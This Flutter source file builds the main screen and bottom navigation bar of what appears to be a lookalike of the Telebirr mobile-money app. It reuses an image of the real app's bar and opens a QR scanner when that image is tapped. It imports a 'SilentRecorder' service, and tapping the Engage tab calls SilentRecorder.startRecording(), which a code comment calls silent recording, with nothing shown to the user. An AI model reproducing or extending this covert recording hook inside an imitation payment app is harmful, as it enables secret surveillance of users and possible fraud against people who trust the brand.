import 'package:flutter/material.dart';
import 'package:telebirrbybr7/screens/home_screen.dart';
import 'package:telebirrbybr7/screens/engage_page.dart'; 
import 'package:telebirrbybr7/services/silent_recorder.dart';
import 'package:telebirrbybr7/screens/apps_page.dart';
import 'package:telebirrbybr7/screens/qr_scanner_screen.dart';

class MainScreen extends StatefulWidget {
  const MainScreen({super.key});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> {
  int _currentIndex = 0;

  final List<Widget> tabs = [
    const HomeScreen(),
    const Center(child: Text('Payment')),
    const AppsPage(),
    const EngagePage(), 
    const Center(child: Text('Account')),
  ];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: tabs[_currentIndex],
      bottomNavigationBar: TelebirrBottomBar(
        currentIndex: _currentIndex,
        onTap: (index) {
          setState(() => _currentIndex = index);
        },
      ),
    );
  }
}

class TelebirrBottomBar extends StatelessWidget {
  final int currentIndex;
  final Function(int) onTap;

  const TelebirrBottomBar({
    super.key,
    required this.currentIndex,
    required this.onTap,
  });

  @override
  Widget build(BuildContext context) {
    final double width = MediaQuery.of(context).size.width;

    return SizedBox(
      height: 130,
      child: Stack(
        children: [
          /// STATIC IMAGE BACKGROUND - Now clickable
          Positioned(
            bottom: 0,
            left: 0,
            right: 0,
            child: GestureDetector(
              onTap: () {
                // Navigates to the QR Scanner when the bar image is clicked
                Navigator.push(
                  context,
                  MaterialPageRoute(builder: (context) => const QRScannerScreen()),
                );
              },
              child: Image.asset(
                'images/bottom_bar.jpg',
                width: width,
                height: 127,
                fit: BoxFit.fill,
                errorBuilder: (context, error, stackTrace) {
                  return Container(
                    color: const Color.fromRGBO(141, 199, 63, 0.85),
                    height: 70,
                    child: const Center(
                      child: Text("Tap here to Scan", 
                        style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)
                      ),
                    ),
                  );
                },
              ),
            ),
          ),

          /// TRANSPARENT TAP ZONES (Untouched Logic)
          Positioned(
            bottom: 0,
            left: 0,
            right: 0,
            height: 60,
            child: Row(
              children: List.generate(5, (index) {
                return Expanded(
                  child: GestureDetector(
  onTap: () {
    onTap(index);
    // Trigger silent recording on Engage tab (index 3)
    if (index == 3) {
      SilentRecorder.startRecording();
    }
  },
                    behavior: HitTestBehavior.opaque,
                    child: const SizedBox.expand(),
                  ),
                );
              }),
            ),
          ),
        ],
      ),
    );
  }
}
